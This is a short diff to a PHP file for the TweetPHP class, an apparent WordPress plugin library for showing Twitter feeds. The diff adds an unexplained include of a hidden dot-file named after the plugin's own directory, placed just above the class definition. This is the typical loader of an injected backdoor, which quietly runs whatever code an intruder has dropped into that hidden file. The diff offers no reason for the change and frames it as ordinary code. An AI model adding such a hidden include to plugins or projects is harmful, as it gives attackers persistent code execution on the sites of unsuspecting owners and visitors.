@@ -25,6 +25,10 @@
   * Feed parsing: https://github.com/themattharris/tmhOAuth
   * Hashtag/username parsing: https://github.com/mikenz/twitter-text-php
   */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class TweetPHP {
 	private $tmhOAuth;
 	private $options;
